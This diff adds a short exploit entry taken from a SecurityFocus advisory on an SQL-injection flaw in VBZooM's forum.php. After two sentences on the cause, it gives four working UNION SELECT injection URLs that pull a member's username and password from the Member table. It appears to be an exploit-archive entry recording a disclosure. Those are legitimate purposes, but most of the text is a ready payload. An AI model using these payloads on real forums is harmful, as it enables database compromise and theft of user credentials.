@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/18472/info
+
+VBZooM is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+For user :
+http://www.example.com/forum.php?MainID=-1%20union%20select%201,2,3,4,5,usertitle,7,8,9,10,11,12,13%20from%20Member%20where%20Memberid%20=1/*
+Or
+http://www.example.com/forum.php?MainID=-1%20union%20select%201,2,3,4,5,usertitle,7,8,9,10,11,12,13,14%20from%20Member%20where%20Memberid%20=1/*
+
+For Password : 
+http://www.example.com/forum.php?MainID=-1%20union%20select%201,2,3,4,5,password,7,8,9,10,11,12,13%20from%20Member%20where%20Memberid%20=1/*
+Or
+http://www.example.com/forum.php?MainID=-1%20union%20select%201,2,3,4,5,password,7,8,9,10,11,12,13,14%20from%20Member%20where%20Memberid%20=1/*
